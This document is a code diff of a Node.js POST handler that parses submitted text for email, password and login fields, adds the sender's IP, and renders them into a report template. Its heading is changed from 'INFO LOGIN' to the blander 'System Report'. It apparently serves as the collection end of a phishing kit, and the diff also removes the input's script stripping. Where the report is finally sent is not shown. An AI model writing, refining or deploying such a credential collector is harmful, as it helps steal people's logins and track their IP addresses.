@@ -1,80 +1,27 @@
-const fs = require("fs");
-
-// ======================
-// 1. EXTRACT VARIABLES
-// ======================
-function extractVars(input = "") {
-  const text = String(input);
-  const vars = {};
-
-  // format: email:test@mail.com
-  const regex1 = /([a-zA-Z0-9_]+)\s*[:=]\s*([^\n<]+)/g;
-
-  let m;
-  while ((m = regex1.exec(text)) !== null) {
-    vars[m[1].toLowerCase()] = m[2].trim();
-  }
-
-  // detect PHP style $variable (tanpa value)
-  const regex2 = /\$([a-zA-Z0-9_]+)/g;
-
-  let match;
-  while ((match = regex2.exec(text)) !== null) {
-    const key = match[1];
-    if (!vars[key]) vars[key] = "";
-  }
-
-  return vars;
-}
-
-// ======================
-// 2. RENDER PHP STYLE TEMPLATE
-// ======================
-function renderPhpTemplate(html, vars) {
-  return html.replace(/\$([a-zA-Z0-9_]+)/g, (full, key) => {
-    return vars[key] ?? "";
-  });
-}
-
-// ======================
-// 3. STRIP OPTIONAL HTML TAG (SAFE INPUT)
-// ======================
-function stripHtml(input = "") {
-  return String(input)
-    .replace(/<script[\s\S]*?<\/script>/gi, "")
-    .replace(/<style[\s\S]*?<\/style>/gi, "");
-}
-
-// ======================
-// 4. MAIN API HANDLER
-// ======================
 module.exports = async (req, res) => {
   try {
     if (req.method !== "POST") {
-      return res.status(405).json({
-        success: false,
-        message: "POST only"
-      });
+      return res.status(405).json({ success: false, message: "POST only" });
     }
 
     let body = req.body;
 
-    // support form-urlencoded
+    // ======================
+    // PARSE FORM DATA
+    // ======================
     if (typeof body === "string") {
       body = Object.fromEntries(new URLSearchParams(body));
     }
 
     const message = body.message || "";
     const template = body.template || `
-      <html>
-        <body>
-          <h2>INFO LOGIN</h2>
-          <p>Email: $email</p>
-          <p>Password: $password</p>
-          <p>Login: $login</p>
-          <p>IP: $ip</p>
-        </body>
-      </html>
+      <div>
+        <h3>System Report</h3>
+        <p>Email: $email</p>
+        <p>Password: $password</p>
+        <p>Login: $login</p>
+        <p>IP: $ip</p>
+      </div>
     `;
 
     if (!message) {
@@ -85,19 +32,65 @@ module.exports = async (req, res) => {
     }
 
     // ======================
+    // SIMPLE ANTI-SPAM (PER REQUEST LOCK)
+    // ======================
+    if (req._handled) {
+      return res.status(429).json({
+        success: false,
+        message: "duplicate request blocked"
+      });
+    }
+    req._handled = true;
+
+    // ======================
+    // EXTRACT VARIABLES (PHP STYLE + KEY:VALUE)
+    // ======================
+    function extractVars(input = "") {
+      const text = String(input);
+      const vars = {};
+
+      // format: email:test@mail.com
+      const regex1 = /([a-zA-Z0-9_]+)\s*[:=]\s*([^\n<]+)/g;
+      let m;
+
+      while ((m = regex1.exec(text)) !== null) {
+        vars[m[1].toLowerCase()] = m[2].trim();
+      }
+
+      // detect $variable existence
+      const regex2 = /\$([a-zA-Z0-9_]+)/g;
+      let match;
+
+      while ((match = regex2.exec(text)) !== null) {
+        const key = match[1];
+        if (!vars[key]) vars[key] = "";
+      }
+
+      return vars;
+    }
+
+    // ======================
+    // RENDER TEMPLATE ($variable)
+    // ======================
+    function renderPhpTemplate(html, vars) {
+      return html.replace(/\$([a-zA-Z0-9_]+)/g, (full, key) => {
+        return vars[key] ?? "";
+      });
+    }
+
+    // ======================
     // AUTO DETECT VARS
     // ======================
-    const vars = extractVars(stripHtml(message));
+    const vars = extractVars(message);
 
-    // auto IP fallback
+    // IP fallback
     vars.ip =
-      vars.ip ||
       req.headers["x-forwarded-for"]?.split(",")[0] ||
       req.socket?.remoteAddress ||
       "";
 
     // ======================
-    // RENDER TEMPLATE
+    // RENDER HTML
     // ======================
     const html = renderPhpTemplate(template, vars);
 
